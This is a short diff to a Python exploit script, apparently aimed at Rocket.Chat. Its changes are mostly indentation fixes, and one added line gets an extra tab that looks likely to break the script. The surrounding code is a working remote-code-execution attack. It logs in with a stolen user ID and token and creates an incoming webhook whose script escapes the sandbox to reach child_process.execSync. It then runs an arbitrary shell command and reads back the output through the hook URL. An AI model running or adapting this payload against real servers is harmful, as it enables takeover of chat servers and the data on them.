@@ -130,8 +130,8 @@ def rce(url,userid,token,cmd):
 	# Creating Integration
 	payload = '{"enabled":true,"channel":"#general","username":"admin","name":"rce","alias":"","avatarUrl":"","emoji":"","scriptEnabled":true,"script":"class Script { process_incoming_request() { const require = console.log.constructor(\'return process.mainModule.require\')(); const { execSync } = require(\'child_process\'); res = execSync(\''+cmd+'\'); return { error: { sucess: true, message: res.toString() } } } }","type":"webhook-incoming"}'
 	cookies = {'rc_uid': userid,'rc_token': token}
-        headers = {'X-User-Id': userid,'X-Auth-Token': token}
-        r = requests.post(url+'/api/v1/integrations.create',cookies=cookies,headers=headers,data=payload)
+	headers = {'X-User-Id': userid,'X-Auth-Token': token}
+	r = requests.post(url+'/api/v1/integrations.create',cookies=cookies,headers=headers,data=payload)
 	data = r.text
 	data = data.split(',')
 	token = data[14]
@@ -143,7 +143,7 @@ def rce(url,userid,token,cmd):
 	u = url + '/hooks/' + _id + '/' +token
 	r = requests.get(u)
 	res = json.loads(r.text)
-        print(res["message"])
+		print(res["message"])
 
 ############################################################
 
